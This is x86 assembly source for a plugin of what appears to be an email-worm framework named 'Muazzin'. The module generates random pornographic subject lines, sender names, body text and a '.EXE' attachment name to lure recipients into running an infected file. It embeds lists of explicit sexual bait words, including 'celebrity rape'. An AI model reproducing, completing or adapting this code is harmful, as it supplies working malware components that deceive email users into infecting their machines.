;Muazzin para gerar texto de email

BITS 32

%include "\muazzin\muazzin.asi"

TYPE    EQU "text"
VERSION EQU 0100h

start:
       jmp entry

gen_da_text:
       call .kernel
       db "KERNEL32.DLL", 0
  .kernel:
       call dword [ebp+GMH]
       call .api
       dd "GetTickCount", 0
  .api:
       push eax
       call dword [ebp+GPA]
       mov ebx, eax

       mov edi, [ebp+m_buffer]                  ;make name.exe
       add edi, mtext_exename
       call rnd
       and ecx, 11b
       jnz .exe2
       call extra
       jmp .exe3
  .exe2:
       call get_word
  .exe3:
       mov eax, ".EXE"
       stosd
       sub eax, eax
       stosd

       mov edi, [ebp+m_buffer]                  ;make sender/subject
       add edi, mtext_headers
       mov eax, "Subj"
       stosd
       mov eax, "ect:"
       stosd
       mov al, " "
       stosb
       call rnd
       and ecx, 1
       jz .noname
       call extra
       mov al, " "
       stosb
  .noname:
       call get_word
       mov eax, 0a0d0000h+"!!"
       stosd
       mov eax, "From"
       stosd
       mov ax, ": "
       stosw
       call extra
       mov eax, 00000a0dh
       stosd

       mov edi, [ebp+m_buffer]
  .again:
       call rnd
       and ecx, 0111b
       inc ecx
       inc ecx
  .next:
       push ecx
       call rnd
       and ecx, 1
       jnz .geral
       call rnd
       and ecx, 1
       jnz .geral
       call extra
       mov al, " "
       stosb
  .geral:
       call get_word
       call rnd
       and ecx, 01111b
       mov al, " "
       cmp cl, 11b
       ja .done
       jecxz .done
       cmp dword [esp],1
       je .done1
       mov al, "&"
       dec ecx
       jz .done
       mov al, "+"
       dec ecx
       jz .done
  .done1:
       mov al, "!"
  .done:
       stosb
       pop ecx
       loop .next
       mov ax, 0a0dh
       stosw
       call rnd
       and ecx, 1
       jnz .again
       sub eax, eax
       stosd
exit:
       mov dword [ebp+m_result], MR_OK
       ret 4

entry:
       mov ebp, [esp+4]
       mov eax, [ebp+m_why]
       test eax, MT_GENTEXT
       jnz near gen_da_text
       test eax, MT_QUERY
       jz near exit
       mov esi, MT_QUERY+MT_GENTEXT
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4

get_word:
       call rnd
       and ecx, 31
       call .words
       db "sex", 0
       db "sexy", 0
       db "hot", 0
       db "hottest", 0
       db "cum", 0
       db "cumshot", 0
       db "horny", 0
       db "anal", 0
       db "gay", 0
       db "oral", 0
       db "pleasure", 0
       db "asian", 0
       db "lesbians", 0
       db "teens", 0
       db "virgins", 0
       db "boys", 0
       db "girls", 0
       db "SM", 0
       db "sado", 0
       db "cheerleader", 0
       db "orgy", 0
       db "black", 0
       db "blonde", 0
       db "sodomized", 0
       db "hardcore", 0
       db "slut", 0
       db "doggy", 0
       db "suck", 0
       db "messy", 0
       db "kinky", 0
       db "fist-fucking", 0
       db "amateurs", 0
  .words:
       pop esi
       jecxz .copy
  .getl:
       lodsb
       test al, al
       jnz .getl                        ;skip word
       loop .getl                       ;next word to skip
  .copy:
       lodsb
       test al, al
       jz .done
       stosb
       jmp .copy
  .done:
       ret

extra:
       call rnd
       and ecx, 7
       call .extras
       db "Anna", 0
       db "Raquel Darian", 0
       db "Xena", 0
       db "Xuxa", 0
       db "Suzete", 0
       db "famous", 0
       db "celebrity rape", 0
       db "leather", 0
  .extras:
       jmp get_word.words

rnd:
       pushad
       call .delta
  .delta:
       pop esi
       add esi, value-.delta
       call ebx
       add dword [esi], eax
       ror dword [esi], 11
       xor dword [esi], ebx
       popad
       db 0b9h                          ;mov ecx, ?
  value dd 0
       ret

